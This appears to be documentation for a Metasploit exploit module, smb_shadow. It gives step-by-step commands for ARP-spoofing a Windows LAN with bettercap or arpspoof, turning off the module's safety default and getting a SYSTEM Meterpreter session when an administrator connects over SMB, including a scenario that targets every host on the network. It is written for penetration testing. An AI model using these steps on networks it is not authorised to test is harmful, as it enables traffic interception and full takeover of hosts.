## Vulnerable Application

To be able to use exploit/windows/smb/smb_shadow, you must meet these requirements:

* There is a Windows SMB Server on the LAN
* There is a Windows SMB Client on the LAN
* Metasploit is running will full local socket access (e.g. as root user)

## Verification Steps

1. Ensure Windows SMB Client and Server are on the LAN
2. Run bettercap targeting both the SMB Client and Server (`bettercap -I <iface> -T <smb-client-ip>,<smb-server-ip>`)
3. Start msfconsole (`sudo msfconsole`)
4. Do `use exploit/windows/smb/smb_shadow`
5. Do `set INTERFACE <iface>`
6. Do `set DefangedMode false`
7. Do `run`
8. Make a SMB Client connect to the SMB Server as an Administrator
9. Receive a Meterpreter Session as SYSTEM on the SMB Server host

## Options

### SHARE

This must be a SMB share that the connecting user has read and write access to.
SHARE is set to `ADMIN$` by default which is the standard share for the Administrator.

### INTERFACE

This must be a network interface on the local machine.
The interface must be on the same network as both the SMB Client and Server.

### DefangedMode

This must be set to false to acknowledge that the module will affect your network configuration.
DefangedMode is set to true by default to prevent unintentional network configuration disruptions.

### DisableFwd

This must be set to false if packet forwarding on port 445 was disabled manually.
DisableFwd is set to true by default to allow the module to disable packet forwarding on port 445.

### ConfirmServerDialect

This must be set to true to have the module confirm the server supports the lowest smb version supported by the client.
ConfirmServerDialect is set to false by default as the above situation is unlikely.

## Scenarios

**Active Windows Network**

Follow the following steps to target all the hosts on the LAN:

1. Run bettercap targeting the entire LAN (`bettercap -I <iface>`)
2. Start msfconsole (`sudo msfconsole`)
3. Do `use exploit/windows/smb/smb_shadow`
4. Do `set INTERFACE <iface>`
5. Do `set DefangedMode false`
6. Do `run`
7. Wait for any SMB Client to connect to any SMB Server as an Administrator
8. Receive a Meterpreter Session as SYSTEM on the SMB Server host

## Notes

This module has a tendency to spawn multiple sessions due to the SMB Client retrying the connection.

This module will not finish execution by itself and should be terminated with Ctrl-C.

Follow the following steps to use arpspoof instead of bettercap on Linux:

1. Enable ipv4 forwarding (`sysctl -w net.ipv4.ip_forward=1`)
2. Start arpspoof targeting the SMB Client (`arpspoof -i <iface> -t <smb-client-ip> <smb-server-ip>`)
3. Start arpspoof targeting the SMB Server (`arpspoof -i <iface> -t <smb-server-ip> <smb-client-ip>`)
